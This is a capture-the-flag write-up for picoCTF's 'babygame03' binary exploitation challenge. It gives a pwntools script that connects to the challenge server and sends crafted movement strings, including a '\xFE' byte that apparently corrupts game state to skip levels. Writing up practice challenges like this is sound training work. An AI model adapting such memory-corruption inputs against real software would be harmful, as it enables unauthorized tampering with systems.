# babygame03

```markdown
Tags: `Binary Exploitation` `game`
```

## **Description**

Break the game and get the flag. Welcome to BabyGame 03! Navigate around the map and see what you can find! Be careful, you don't have many moves. There are obstacles that instantly end the game on collision. The game is available to download [here](https://artifacts.picoctf.net/c\_rhea/5/game). There is no source available, so you'll have to figure your way around the map.

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

## **Solution Strategy**

```python
from pwn import *

remote_server = 'rhea.picoctf.net'
remote_port = 50008

io = remote(remote_server, remote_port)

payloads = [
    'lsdddddddddddddddddddddddddddddddddddwwwww', # Level 1
    'dddddddddddddddddddddddddddddddwwwww',       # Level 2
    'dddddddddddddddddddddddddddwwwww',           # Level 3
    'dddddddddddddddddddddddwwwww',               # Level 4
    'l\xFEdddddddddddddddddddwwwww'               # Level 5
]

for payload in payloads:
    io.sendline(payload)

io.interactive()

io.close()
```

* **Importing `pwntools`**: It leverages `pwntools`, a framework designed for developing exploits, to simplify interactions with network services and binary processes.
* **Remote Connection Setup**: Specifies the target's server address and port, then establishes a remote connection to this target, creating a communication channel for sending data and receiving responses.
* **Payloads Definition**: Outlines an array named `payloads`, with each element being a string intended to exploit or manipulate a specific level within the game. These strings are tailored commands that, when executed by the game, advance the player through each level or exploit certain vulnerabilities.
* **Payloads Delivery**: Iterates over the `payloads` array, sending each payload sequentially through the established remote connection. This assumes the game processes each input in the order received and moves the player through the game's levels accordingly.
* **Interactive Session**: After sending all the payloads, the script transitions to an interactive mode using `io.interactive()`. This mode allows the script runner to manually interact with the game, useful for observing the results of the exploitation or for further manual exploitation.
* **Connection Closure**: Finally, it properly closes the remote connection to clean up resources and end the session with the target game.

## Flag

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
